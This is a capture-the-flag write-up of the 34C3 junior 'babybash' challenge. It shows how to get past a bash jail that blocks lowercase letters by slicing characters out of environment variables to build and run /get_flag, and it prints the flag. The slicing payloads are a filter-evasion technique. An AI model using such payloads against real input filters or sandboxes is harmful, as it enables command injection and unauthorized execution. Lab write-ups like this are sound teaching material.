# Babybash  
## Challenge  
The challenge was of the difficulty "medium" and the URl to the archived
challenge is:  
[babybash](https://archive.aachen.ccc.de/junior.34c3ctf.ccc.ac/challenges/index.html#challenge-
panel-body-25)  
The task:  
> If you're a baby and know bash, try this:  
> `nc 35.189.118.225 1337`

When you connect to the target system, you find out that most commands are not
accepted and that you should type `help` to find out more. If you type help,
you get a message, telling you that you you are in a bash-jail and you need to
execute  
```  
/get_flag  
```  
... but you are not allowed to use  
* a-z  
* \*  
* ?  
* .

So you may not use any lower case characters, but you need to execute a lower
case binary.  
After fiddling around with the shell, I came up with the following solution...  
## ${Environment_Variables_Solution}  
In newer bash versions, you can access variables and also cut out single
characters of variables, using the following syntax:  
```  
${VARAIBLE_NAME:STARTING_POSITION:COUNT_OF_CHARACTERS}  
```

So, what I wanted to do is to cut out the correct required characters, to get
the required command.

While fiddeling around with the shell, I found out that there is a timeout,
that will log you out after some time. Some environment variables were only
temporary, meaning that their content was depending on your current session.

To solve the challenge, I needed to find appropriate environment variables,
that ideally should be stable because of the automatic timeout.  
In my final solution, I used the following environment variables:  
```  
OSTYPE=linux-gnu  
HOSTNAME=28e32c6defa5  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
HOME=/tmp/35bc811cfbed0af609271fe0e3eed49f5fe7f184  
```

### /get_flag  
The following syntax got me /get_flag:  
```  
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}${HOSTNAME:10:1}${OSTYPE:6:1}  
```

Expecting this challenge to be done now, I was already excited - just to be
greeted by the message, that the command requires and argument:

```  
/get_flag: /get_flag gimme_FLAG_please  
```

I was thinking "NOOO now I must find more characters in my environment ...
argh".  
But then I thought of a shortcut.

### /get_flag gimme_FLAG_please  
So, I don't need to find anything new, I can just use the output of
`/bin/get_flag`, write it to a file and then cut the required data from that
file and execute it.

So what I want to execute is:  
```  
/get/flag > BAR  
#writes "/get_flag: /get_flag gimme_FLAG_please" to file BAR  
$(cat BAR | cut -d  -f 2,3)   
#which cuts the the string "/get_flag gimme_FLAG_please" and executes it  
```

My final solution was:

```  
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}${HOSTNAME:10:1}${OSTYPE:6:1}
>BAR

$( ${HOSTNAME:5:1}${HOSTNAME:10:1}${HOME:1:1} BAR | ${HOSTNAME:5:1}${PATH:1:1}${HOME:1:1} -${HOSTNAME:7:1}" "  -${HOSTNAME:9:1} 2,3)  
```  
Resulting in the message:  
```  
Good job!

Here's your flag: 34C3_LoOks_lik3_y0U_are_nO_b4by_4ft3r_4ll  
```

Wooohoo!

## Disclaimer  
This is my first writeup. I hope, you enjoy this interesting but inefficient
solution.